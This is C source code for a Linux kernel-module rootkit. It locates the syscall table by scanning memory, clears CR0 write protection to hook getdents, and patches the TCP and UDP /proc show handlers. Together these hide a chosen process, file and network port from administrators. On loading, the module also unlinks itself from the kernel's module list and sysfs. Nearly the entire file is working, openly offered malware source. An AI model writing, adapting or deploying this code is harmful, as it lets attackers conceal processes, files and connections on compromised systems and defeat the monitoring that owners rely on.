#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <asm/pgtable.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/mutex.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>
#include <linux/kernfs.h>
#include <linux/rbtree.h>
#include <linux/hash.h>
#include <linux/dirent.h>
#include <linux/inet_diag.h>
#include <net/tcp.h>
#include <net/udp.h>

struct linux_dirent {
	unsigned long  d_ino;     /* Inode number */
	unsigned long  d_off;     /* Offset to next linux_dirent */
	unsigned short d_reclen;  /* Length of this linux_dirent */
	char           d_name[];  /* Filename (null-terminated) */
};

struct proc_dir_entry {
		unsigned int low_ino;
		umode_t mode;
		nlink_t nlink;
		kuid_t uid;
		kgid_t gid;
		loff_t size;
		const struct inode_operations *proc_iops;
		const struct file_operations *proc_fops;
		struct proc_dir_entry *parent;
		struct rb_root subdir;
		struct rb_node subdir_node;
		void *data;
		atomic_t count;					/* use count */
		atomic_t in_use;				/* number of callers into module in progress; */
										/* negative -> it's going away RSN */
		struct completion *pde_unload_completion;
		struct list_head pde_openers;	/* who did ->open, but not ->release */
		spinlock_t pde_unload_lock;		/* proc_fops checks and pde_users bumps */
		u8 namelen;
		char name[];
};

unsigned long cr0;
static unsigned long *sys_call_table;

asmlinkage long (*real_getdents) (unsigned int, struct linux_dirent *, unsigned int);

asmlinkage int (*real_tcp4_show) (struct seq_file *, void *);
asmlinkage int (*real_tcp6_show) (struct seq_file *, void *);
asmlinkage int (*real_udp4_show) (struct seq_file *, void *);
asmlinkage int (*real_udp6_show) (struct seq_file *, void *);

static int fake_tcp4_show(struct seq_file *, void *);
static int fake_tcp6_show(struct seq_file *, void *);
static int fake_udp4_show(struct seq_file *, void *);
static int fake_udp6_show(struct seq_file *, void *);

#define START_MEM PAGE_OFFSET
#define END_MEM ULONG_MAX

static char *hide_dir = "/"; // Invalid filename in case none is supplied by module parameter
static int hide_pid = -1; // Invalid PID in case none is supplied by module parameter
static int hide_port = -1; // Invalid port number in case none is supplied by module parameter

module_param(hide_dir, charp, 0000); // Filename of file/directory to be hidden
module_param(hide_pid, int, 0000); // PID of process to be hidden
module_param(hide_port, int, 0000); // Port whose connections must be hidden

MODULE_LICENSE("GPL v2");

// Get the table relating each system call to the routine to be run when called:
unsigned long *get_syscall_table_bf(void) {

    unsigned long *syscall_table;
    unsigned long int i;

    // Go through the memory testing each possible pointer:
    for (i = START_MEM; i < END_MEM; i += sizeof(void *)) {
        // Interpret current position as a pointer to the table:
        syscall_table = (unsigned long *) i;

        // If the pointer to sys_close is the same as the one dereferenced from the possible table, assume we found the
        // syscall table:
        if (syscall_table[__NR_close] == (unsigned long) sys_close) {
            return syscall_table;
        }
    }

    return NULL;
}

// Hook for intercepting the getdents syscall and hiding arbitrary files/directories given a PID and/or a filename:
asmlinkage static long fake_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {

    long total_bytes, bytes_remaining;
    struct linux_dirent *real_dents, *dent;

    // Get real directory entries:
    if ((total_bytes = (*real_getdents)(fd, dirp, count)) == 0) {
        // If number of entries is 0, return 0:
        return 0;
    }

    // Allocate kernel-space buffer to store real directory entries:
    real_dents = (struct linux_dirent *) kmalloc(total_bytes, GFP_KERNEL);

    // Copy real directory entries from user-space buffer to kernel-space buffer:
    __copy_from_user(real_dents, dirp, total_bytes);

    // Use a pointer to iterate through entries:
    dent = real_dents;

    // While there are entries to be processed:
    bytes_remaining = total_bytes;
    while (bytes_remaining > 0) {

        // Update remaining bytes to go through:
        bytes_remaining -= dent->d_reclen;

        // If current entry points to directory of process to be hidden or to file to be hidden:
        if (simple_strtoul(dent->d_name, NULL, 10) == hide_pid || strstr(dent->d_name, hide_dir)) {
            // Decrease number of total bytes since the entry will be removed:
            total_bytes -= dent->d_reclen;

            // Shift next entries up so the current entry will be overwritten:
            memmove(dent, (char *) dent + dent->d_reclen, bytes_remaining);

            // Since the entries were shifted, the current pointer points to a different entry, so no need to update it.
        }
        else {
            // Point to next entry:
            dent = (struct linux_dirent *) ((char *) dent + dent->d_reclen);
        }
    }

    // Copy fake entry list to user-space buffer:
    __copy_to_user((void *) dirp, (void *) real_dents, total_bytes);

    // Deallocate kernel-space buffer:
    kfree(real_dents);

    // Return fake size of directory entry list:
    return total_bytes;
}

// Hook for intercepting the tcp4_show call and hiding arbitrary connections given a port:
static int fake_tcp4_show(struct seq_file *m, void *v) {

	struct inet_sock *inet;
	int port;

	if (SEQ_START_TOKEN == v) {
		return real_tcp4_show(m, v);
    }

    // Retrieve source port:
	inet = inet_sk((struct sock *) v);
	port = ntohs(inet->inet_sport);

    // If port is the one to be hidden, return nothing:
	if (port == hide_port) {
		return 0;
    }

    // Return actual function call return value:
	return real_tcp4_show(m, v);
}

// Hook for intercepting the tcp6_show call and hiding arbitrary connections given a port:
static int fake_tcp6_show(struct seq_file *m, void *v) {

	struct inet_sock *inet;
	int port;

	if (SEQ_START_TOKEN == v) {
		return real_tcp6_show(m, v);
    }

    // Retrieve source port:
	inet = inet_sk((struct sock *) v);
	port = ntohs(inet->inet_sport);

    // If port is the one to be hidden, return nothing:
	if (port == hide_port) {
		return 0;
    }

    // Return actual function call return value:
	return real_tcp6_show(m, v);
}

// Hook for intercepting the udp4_show call and hiding arbitrary connections given a port:
static int fake_udp4_show(struct seq_file *m, void *v) {

	struct inet_sock *inet;
	int port;

	if (SEQ_START_TOKEN == v) {
		return real_udp4_show(m, v);
    }

    // Retrieve source port:
	inet = inet_sk((struct sock *) v);
	port = ntohs(inet->inet_sport);

    // If port is the one to be hidden, return nothing:
	if (port == hide_port) {
		return 0;
    }

    // Return actual function call return value:
	return real_udp4_show(m, v);
}

// Hook for intercepting the udp6_show call and hiding arbitrary connections given a port:
static int fake_udp6_show(struct seq_file *m, void *v) {

	struct inet_sock *inet;
	int port;

	if (SEQ_START_TOKEN == v) {
		return real_udp6_show(m, v);
    }

    // Retrieve source port:
	inet = inet_sk((struct sock *) v);
	port = ntohs(inet->inet_sport);

    // If port is the one to be hidden, return nothing:
	if (port == hide_port) {
		return 0;
    }

    // Return actual function call return value:
	return real_udp6_show(m, v);
}

// This function is called when the module is loaded, setting up all hooks for hiding stuff:
static int __init setup_hooks(void) {

    /* SETUP HOOK FOR HIDING FILES/DIRECTORIES */

    // Try to retrieve syscall table dynamically:
    sys_call_table = (unsigned long *) get_syscall_table_bf();

    // Read control register:
    cr0 = read_cr0();

    // Hide itself:
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    list_del(&THIS_MODULE->mkobj.kobj.entry);

    // If syscall table was found, procceed with getdents hooking:
    if (sys_call_table) {
        // Save original getdents syscall address:
        real_getdents = (asmlinkage long (*) (unsigned int, struct linux_dirent *, unsigned int))
            sys_call_table[__NR_getdents];

        // Replace getdents syscall address in the syscall table by the hook:
        write_cr0(cr0 & ~0x00010000);
        sys_call_table[__NR_getdents] = (unsigned long)fake_getdents;
        write_cr0(cr0);
    }

    /*******************************************/

    /* SETUP HOOKS FOR HIDING CONNECTIONS */

	struct rb_root proc_rb_root;
	struct rb_node *proc_rb_last, *proc_rb_nodeptr;
	struct proc_dir_entry *proc_dir_entryptr;
	struct tcp_seq_afinfo *tcp_seq;
	struct udp_seq_afinfo *udp_seq;

    // Get protocols on /proc/net/:
	proc_rb_root = init_net.proc_net->subdir;

	proc_rb_last = rb_last(&proc_rb_root);
	proc_rb_nodeptr = rb_first(&proc_rb_root);

    // Go through all protocol files:
	while (proc_rb_nodeptr != proc_rb_last) {
		proc_dir_entryptr = rb_entry(proc_rb_nodeptr, struct proc_dir_entry, subdir_node);

		// We want to hide tcp, tcp6, udp and udp6 connections:
		if (!strcmp(proc_dir_entryptr->name, "tcp")) {
			tcp_seq = proc_dir_entryptr->data;

            // Save original function call address:
			real_tcp4_show = tcp_seq->seq_ops.show;

			// Replace address to function by our hook:
			tcp_seq->seq_ops.show = fake_tcp4_show;
		}
        else if (!strcmp(proc_dir_entryptr->name, "tcp6")) {
			tcp_seq = proc_dir_entryptr->data;

            // Save original function call address:
			real_tcp6_show = tcp_seq->seq_ops.show;

			// Replace address to function by our hook:
			tcp_seq->seq_ops.show = fake_tcp6_show;
		}
        else if  (!strcmp(proc_dir_entryptr->name, "udp")) {
			udp_seq = proc_dir_entryptr->data;

            // Save original function call address:
			real_udp4_show = udp_seq->seq_ops.show;

			// Replace address to function by our hook:
			udp_seq->seq_ops.show = fake_udp4_show;
		}
        else if (!strcmp(proc_dir_entryptr->name, "udp6")) {
			udp_seq = proc_dir_entryptr->data;

            // Save original function call address:
			real_udp6_show = udp_seq->seq_ops.show;

			// Replace address to function by our hook:
			udp_seq->seq_ops.show = fake_udp6_show;
		}

		proc_rb_nodeptr = rb_next(proc_rb_nodeptr);
	}

    /**************************************/

    return 0;
}

// This function is called when the module is unloaded, cleaning up all hooks and therefore restoring the original
// system state:
static void __exit cleanup_hooks(void) {

    /* CLEANUP GETDENTS HOOKING */

    // If syscall table was found before, undo getdents hooking:
    if (sys_call_table) {
        // Restore original syscall address:
        write_cr0(cr0 & ~0x00010000);
        sys_call_table[__NR_getdents] = (unsigned long)real_getdents;
        write_cr0(cr0);
    }

    /****************************/

    /* CLEANUP NET PROTOCOLS HOOKING */

	struct rb_root proc_rb_root;
	struct rb_node *proc_rb_last, *proc_rb_nodeptr;
	struct proc_dir_entry *proc_dir_entryptr;
	struct tcp_seq_afinfo *tcp_seq;
	struct udp_seq_afinfo *udp_seq;

    // Get protocols on /proc/net/:
	proc_rb_root = init_net.proc_net->subdir;

	proc_rb_last = rb_last(&proc_rb_root);
	proc_rb_nodeptr = rb_first(&proc_rb_root);

    // Go through all protocol files:
	while (proc_rb_nodeptr != proc_rb_last) {
		proc_dir_entryptr = rb_entry(proc_rb_nodeptr, struct proc_dir_entry, subdir_node);

		// We want to unhide tcp, tcp6, udp and udp6 connections:
		if (!strcmp(proc_dir_entryptr->name, "tcp")) {
			tcp_seq = proc_dir_entryptr->data;

            // Restore original function address:
			tcp_seq->seq_ops.show = real_tcp4_show;
		}
        else if (!strcmp(proc_dir_entryptr->name, "tcp6")) {
			tcp_seq = proc_dir_entryptr->data;

            // Restore original function address:
			tcp_seq->seq_ops.show = real_tcp6_show;
		}
        else if (!strcmp(proc_dir_entryptr->name, "udp")) {
			udp_seq = proc_dir_entryptr->data;

            // Restore original function address:
			udp_seq->seq_ops.show = real_udp4_show;
		}
        else if (!strcmp(proc_dir_entryptr->name, "udp6")) {
			udp_seq = proc_dir_entryptr->data;

            // Restore original function address:
			udp_seq->seq_ops.show = real_udp6_show;
		}

		proc_rb_nodeptr = rb_next(proc_rb_nodeptr);
	}

    /*********************************/
}

module_init(setup_hooks);
module_exit(cleanup_hooks);